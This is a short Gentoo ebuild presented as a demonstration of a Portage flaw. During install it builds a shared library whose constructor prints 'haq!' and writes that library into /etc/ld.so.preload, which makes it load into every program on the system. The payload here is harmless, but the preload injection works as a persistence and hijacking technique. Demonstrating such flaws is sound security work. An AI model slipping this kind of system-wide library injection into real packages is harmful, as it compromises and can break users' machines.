# Copyright 1999-2010 Gentoo Foundation
# Distributed under the terms of the GNU General Public License v2
# $Header: $

EAPI=3

DESCRIPTION="An example of a portage flaw. Make sure it doesn't break your spawning stuff before running."
HOMEPAGE=""
SRC_URI=""

LICENSE="WTFPL-2"
SLOT="0"
KEYWORDS="~x86 ~amd64"
IUSE=""

DEPEND=""
RDEPEND="${DEPEND}"

src_compile() {
	cat > a.c << EOF
void __attribute__((constructor)) init() {
	puts("haq!");
}
EOF
	cc -w -fPIC -shared -o lib$PN.so a.c
}

src_install() {
	dolib.so lib$PN.so
	mkdir "$D/etc/"
	echo /usr/lib/lib$PN.so > "$D/etc/ld.so.preload"
}

